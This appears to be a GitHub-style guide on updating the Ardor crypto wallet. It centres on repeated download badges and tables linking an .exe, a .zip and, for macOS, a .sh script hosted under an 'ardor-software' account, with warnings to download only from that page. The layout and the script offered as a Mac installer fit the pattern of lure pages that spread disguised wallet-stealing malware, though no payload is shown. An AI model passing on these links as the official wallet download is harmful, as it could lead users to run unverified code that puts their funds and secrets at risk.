![Ardor Wallet guide](assets/banner-article.png)

# What the current Ardor release changes, and how to update

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Each Ardor release ships the wallet application and the platform code together, and the release notes on the GitHub releases page list what changed in that build. Updating means downloading the current asset for your system and running it; the account, the secret and the balance are untouched by the process.

## What a release contains

A release is a build of the whole client: the interface, the [Ardor node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md), the protocol rules the node enforces, and the libraries both depend on. That is why a release can fix a display problem and a consensus problem in the same download, and why the notes read like a list of unrelated items.

The platform and the wallet share a version history but not always a version number in step. A node may be several point releases behind a wallet build, and the two are described separately in the notes and on the [Ardor download](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md) page.

## Why updating is usually the fix

Most problems people report have already been addressed in a later build. A sync that stalls, a [Java](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/fix-ardor-wallet-java-error.md) error on start, a fee estimate that looks wrong, a transaction validation edge case - each of those is the kind of thing a release changes, and running the current build removes the question.

Some updates are not optional in any practical sense. When a change affects consensus, nodes on older builds stop following the chain, and the network leaves them behind. The visible symptom is a node that will not [sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md); the cause is a version, not a network fault.

## How to update

1. Open the GitHub releases page and read the notes for the current release.
2. Download the asset for your operating system.
3. Verify the file against the value the release publishes for that asset.
4. Close the running wallet, then install the new build over the old one or unpack it into a fresh directory.
5. Start the wallet and let it catch up if it runs a full node.
6. Confirm the account opens with the same address as before.

Step six is the reassurance, but it is also a check worth doing deliberately. The account is derived from the secret, so the address should be identical, and a different address means the secret was mistyped rather than the update having changed anything.

## Reading the release notes

Notes are written for operators and users at once, which makes them uneven. The parts worth reading first are the ones that mention consensus, mandatory changes, database format, or Java requirements, because those are the items that can stop a node working rather than merely change a screen.

Feature entries are the other half. A release that adds a capability usually describes it in a sentence or two, and that sentence is the most reliable description available of how the feature behaves on the day it ships.

## What updating does not do

It does not touch your account, your balance or your secret. It does not reset your preferences deliberately, though a reinstall can return them to defaults. And it does not repair a corrupted database: a node that is already broken can need its chain data rebuilt after the update as well as before it.

For a light client, an update is quick and cheap. For a full node, budget time for the download, the install and any catching up the node has to do afterwards.

## What the version numbers mean

The wallet and the platform are versioned separately, and the numbers do not always move together. A build can carry a wallet version while the node underneath reports a platform version, and both appear in the notes.

When a guide names a version, check which one it means before concluding that your install is behind. The release page is the reference for both, and it is the only page that describes the build you are actually downloading.

## Keeping a copy of the previous build

The old installer is worth keeping until the new build has opened your account and caught up with the chain. It costs a little disk space and it converts a failed update into a short step backwards.

Delete the old copy once the new one has proved itself, rather than collecting installers indefinitely. An archive of old builds is a small risk with no benefit after a week.

## After the update

Check three things: that the wallet opens, that the account shows the address you expect, and that the node is following the chain. If any of those fails, the update itself is the first suspect and the release notes are the first place to look.

Keep the previous build until the new one has done all three. It costs a little disk space and it turns a failed update into a five-minute rollback rather than a rebuild.

## FAQ

### Will updating delete my account?

No. The account comes from your passphrase or seed and is not stored in the application. Updating replaces the program, not the account.

### Do I have to update immediately?

For a consensus change, yes - older nodes stop following the chain. For a feature or interface change, updating is still the fix for most reported problems.

### Where do I find what changed?

In the release notes on the GitHub releases page. Read the consensus and requirement entries first, then the feature entries.

### Can I skip several releases at once?

Yes. Install the current release directly; there is no need to step through each intermediate build.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Install the Ardor wallet on Windows, macOS or Linux](https://github.com/ardor-software/ardor-wallet-guides/blob/main/install-ardor-wallet-on-windows-macos-linux.md)
- [Why an out-of-date Ardor node stops working](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/update-ardor-or-be-blacklisted.md)
- [Verify an Ardor wallet download before you run it](https://github.com/ardor-software/ardor-wallet-guides/blob/main/verify-your-ardor-wallet-download.md)
- [Fix an Ardor wallet that will not sync](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-wallet-not-syncing-fix.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
